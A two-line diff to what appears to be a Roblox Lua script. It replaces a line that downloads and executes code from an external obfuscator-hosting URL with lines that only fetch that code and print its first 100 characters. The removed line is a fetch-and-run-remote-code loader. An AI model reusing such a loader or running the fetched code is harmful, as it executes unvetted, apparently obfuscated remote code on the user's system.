@@ -1,1 +1,2 @@
-loadstring(game:HttpGet("https://obfuscatorhub.onrender.com/api/a8eoxhbo"))()
+local source = game:HttpGet("https://obfuscatorhub.onrender.com/api/a8eoxhbo")
+warn(typeof(source), source and source:sub(1, 100))
